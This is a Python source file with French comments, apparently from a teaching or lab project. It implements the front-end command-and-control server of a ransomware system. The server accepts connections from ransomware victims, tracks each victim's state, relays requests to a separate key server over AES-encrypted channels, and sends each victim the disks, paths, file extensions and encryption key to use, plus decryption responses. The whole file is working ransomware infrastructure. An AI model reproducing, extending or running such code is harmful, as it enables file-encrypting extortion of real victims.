import string
import random
import time

import utile.network as network
import utile.message as message
import utile.security as security
import utile.config as config
import queue
from threading import Thread

load = config.load_config('../configuration/config/serveur_frontal.cfg', '../configuration/config/serveur_frontal.key')
PORT = 8381
PORT_RANSOMWARE = 8443
IP_FRONT = '192.168.133.18'
CONFIG_SERVEUR = config.load_config('../configuration/config/serveur.cfg', '../configuration/config/serveur.key')
CONFIG_WORKSTATION = config.load_config('../configuration/config/workstation.cfg','../configuration/config/workstation.key')
status_victims = {}

def simulate_hash(longueur=0):
    letters = string.hexdigits
    return ''.join(random.choice(letters) for i in range(longueur))


def main():
    queue_principale = queue.Queue()  # Queue FIFO réceptionnant toutes les demandes venant des ransomware
    # Démarrage du Thread de communication avec le serveur de clés
    t_srv_cles = Thread(target=thread_srv_cles, args=(queue_principale,), daemon=True)
    t_srv_cles.start()

    queue_principale.get()  # Attend que le serveur frontal soit connecté au serveur de clés avant de lancer le code
    # il recoit dans le thread serveur cle, "SERVEUR_CLE_CONNECTED"
    print("[Serveur frontal] - Serveur de clés connecté.")
    queue_principale.task_done()  # Libère le thread srv clés
    s_serveur = network.start_net_serv( port=PORT_RANSOMWARE)
    while True:
        conn_victim, address_victim = s_serveur.accept()
        print(f"[Serveur frontal] : Connexion d'un ransomware {address_victim} a été établie.")
        q_multi_ransomware = queue.Queue()  # Queue FIFO réponse victime
        # Démarrage du Thread de communication avec le ransomware
        t_victims = Thread(target=thread_ransomware, args=(conn_victim,queue_principale, q_multi_ransomware,),daemon=True)
        t_victims.start()
def thread_srv_cles(queue_principale):
    # Connection vers le serveur de clés
    s_srv_cles = network.connect_to_serv(port=PORT, retry=60)
    aes_key = security.diffie_hellman_recv_key(s_srv_cles)
    # Utilise la queue FIFO q_messages_receiv pour valider la connexion au serveur de cles
    queue_principale.put('SERVEUR_CLE_CONNECTED') # La il confirme qu'il s'est connecté
    queue_principale.join()  # Attend que le main lance l'écoute des ransomwares

    while True:
        msg = queue_principale.get()
        print("message thread serv clé : " + str(msg))# Réceptionne les msg en queue reçu des ransomware
        # on execute pas le code tant qu'on recoit pas de message_ransomware
        # Retire la queue FIFO du ransomware où envoyer la réponse
        if 'queue' in msg.keys():
            q_reponse = msg['queue'] # la il prend pour le ransomware 1
            msg.pop('queue')  # Retire la clé 'queue' du dictionnaire msg
        msg_type = message.get_message_type(msg)
        if msg_type == 'CRYPT_START':
            msg = security.aes_encrypt(msg, aes_key)
            network.send_message(s_srv_cles, msg)
        if msg_type == 'RESTART_REQ':
            msg = security.aes_encrypt(msg, aes_key)
            network.send_message(s_srv_cles, msg)
            msg = network.receive_message(s_srv_cles)
            msg = security.aes_decrypt(msg, aes_key)
            msg_type = message.get_message_type(msg)
            if msg_type == 'RESTART_RESP':
                print(f"L'ID de la nouvelle victime est : {msg['RESTART_RESP']}")
                print(f"Sa clé de chiffrement est :")
                print(f"{msg['KEY']}")
                q_reponse.put(msg)
        if msg_type == "PENDING_MSG":
            msg = security.aes_encrypt(msg, aes_key)
            network.send_message(s_srv_cles, msg)
            msg = network.receive_message(s_srv_cles)
            print("recoit decrypt")
            msg = security.aes_decrypt(msg, aes_key)
            msg_type = message.get_message_type(msg)
            q_reponse.put(msg)
            print("l'envoie au thread rans")
        if msg_type == 'INITIALIZE_REQ':
            msg = security.aes_encrypt(msg, aes_key)
            network.send_message(s_srv_cles, msg)
            # Réception de la réponse
            msg = network.receive_message(s_srv_cles)
            msg = security.aes_decrypt(msg, aes_key)
            msg_type = message.get_message_type(msg)
            if msg_type == 'INITIALIZE_KEY':
                print(f"L'ID de la nouvelle victime est : {msg['KEY_RESP']}")
                print(f"Son dernier état connu en DB est : {msg['STATE']}")
                print(f"Sa clé de chiffrement est :")
                print(f"{msg['KEY']}")
                q_reponse.put(msg)


def thread_ransomware(conn_victim, queue_principale, q_multi_ransomware):
    while True:
        msg = network.receive_message(conn_victim)
        if msg is None:
            time.sleep(1)  # Ajouter un délai pour éviter le bouclage rapide
            break
        else:
            msg_type = message.get_message_type(msg)
            # Si le message reçu est un list_victim_req
            if msg_type == 'INITIALIZE_REQ':
                if msg['INITIALIZE'] in status_victims.keys():
                    print(f"{msg['INITIALIZE']}")
                else:
                    status_victims[msg['INITIALIZE']] = 'INITIALIZE'
                    print("status victims : " + str(status_victims))
                msg['queue'] = q_multi_ransomware    # le message est envoyé vers la queue de chaque ransomware propre a lui
                queue_principale.put(msg)          # Envoi du msg en queue
                key_resp = q_multi_ransomware.get()  # Réception du msg venant du serveur de clés
                if msg['OS'] == 'SERVEUR':
                    config_ransomware = CONFIG_SERVEUR
                else:
                    config_ransomware = CONFIG_WORKSTATION
                # params ==> 0 = id, 1 = disks, 2 = paths, 3 = file_ext, 4 =freq, 5 = key
                msg = message.set_message('initialize_resp', [key_resp['KEY_RESP'], config_ransomware['DISKS'], config_ransomware['PATHS'], config_ransomware['FILE_EXT'], config_ransomware['FREQ'], key_resp['KEY'], key_resp['STATE']])
                network.send_message(conn_victim, msg)
                print("Message envoyé a la victime : " + str(msg))
            elif msg_type == 'CRYPT_START':
                if msg['CRYPT'] in status_victims.keys():
                    print(f"{msg['CRYPT']}")
                else:
                    status_victims[msg['CRYPT']] = 'CRYPT'
                    print("status victims : " + str(status_victims))
                msg['queue'] = q_multi_ransomware  # le message est envoyé vers la queue de chaque ransomware propre a lui
                queue_principale.put(msg)
                time.sleep(5)
            elif msg_type == 'PENDING_MSG':
                if msg['PENDING'] in status_victims.keys():
                    print(f"{msg['PENDING']}")
                else:
                    status_victims[msg['PENDING']] = 'PENDING'
                    print("status victims : " + str(status_victims))
                msg['queue'] = q_multi_ransomware  # le message est envoyé vers la queue de chaque ransomware propre a lui
                queue_principale.put(msg)
                decrypt_resp = q_multi_ransomware.get()
                print("recoit decrypt_resp = " + str(decrypt_resp))# Réception du msg venant du serveur de clés
                msg = message.set_message("DECRYPT_REQ", [decrypt_resp["DECRYPT"], decrypt_resp["KEY"]])
                network.send_message(conn_victim, msg)
                time.sleep(5)
            elif msg_type == 'RESTART_REQ':
                print("Message RESTART REQ")
                msg['queue'] = q_multi_ransomware  # le message est envoyé vers la queue de chaque ransomware propre a lui
                queue_principale.put(msg)
                restart_resp = q_multi_ransomware.get()
                print(restart_resp)  # Réception du msg venant du serveur de clés
                msg = message.set_message("RESTART_RESP", [restart_resp["RESTART_RESP"], restart_resp["KEY"]])
                network.send_message(conn_victim, msg)



if __name__ == '__main__':
    main()